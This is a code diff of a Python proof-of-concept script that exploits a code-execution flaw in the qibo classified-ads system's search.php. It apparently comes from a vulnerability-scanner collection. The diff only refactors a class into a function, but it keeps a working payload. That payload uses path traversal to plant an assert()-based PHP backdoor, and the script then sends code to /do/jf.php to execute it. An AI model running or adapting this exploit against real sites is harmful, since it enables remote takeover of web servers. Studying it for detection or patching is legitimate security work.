@@ -10,23 +10,16 @@ import sys
 import json
 import requests
 import warnings
-
-  
-
-class search_code_exec:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['qibo分类系统search.php 代码执行','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert($_POST[vuln])}"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            vulnurl = self.url + "/do/jf.php"
+            vulnurl = url + "/do/jf.php"
             post_data = {
                 "vuln":"phpinfo();"
             }
@@ -43,5 +36,4 @@ class search_code_exec:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = search_code_exec(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
